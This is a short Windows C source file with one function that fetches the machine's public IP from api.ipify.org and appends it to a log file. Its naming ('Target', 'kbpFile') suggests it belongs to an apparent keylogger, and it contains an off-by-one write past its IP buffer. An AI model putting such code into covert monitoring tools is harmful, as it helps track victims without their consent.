#include "main.h"
#include "net.h"

void GetTargetPublicIp(FILE* kbpFile, wchar_t kbtestfile[])
{
	HINTERNET hNet, hConn, hRequest;
	BOOL bRequestSent;

	if ((hNet = InternetOpen("IP Retriever", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) != NULL)
	{
		if ((hConn = InternetConnect(hNet, "api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP,
			0, 0)) != NULL)
		{
			if ((hRequest = HttpOpenRequest(hConn, "GET", NULL, "HTTP/1.1", NULL, NULL, 0, 0)) != NULL)
			{
				if ((bRequestSent = HttpSendRequest(hRequest, NULL, 0, NULL, 0)) == TRUE)
				{
					char ip[64];
					DWORD bRead;

					if ((InternetReadFile(hRequest, &ip, sizeof(ip), &bRead)) == TRUE)
					{
						ip[bRead] = 0;
						char buffer[256];
						_wfopen_s(&kbpFile, kbtestfile, L"a+");
						sprintf_s(buffer, 256, "[%s]", ip);
						fputs(buffer, kbpFile);
						fclose(kbpFile);
					}
				}
			}
			InternetCloseHandle(hRequest);
		}
		InternetCloseHandle(hConn);
	}
	InternetCloseHandle(hNet);
}